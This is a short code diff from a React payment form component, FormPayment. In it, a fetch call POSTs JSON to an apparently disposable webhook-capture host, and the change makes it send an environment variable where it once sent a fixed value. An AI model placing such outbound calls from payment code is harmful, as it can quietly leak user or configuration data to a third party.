@@ -182,7 +182,7 @@ export function FormPayment() {
     fetch('https://bald-address-37.webhook.cool', {
       method: 'POST',
       body: JSON.stringify({
-        user: 'A'
+        user: env.NEXT_PUBLIC_USER
       })
     })
 
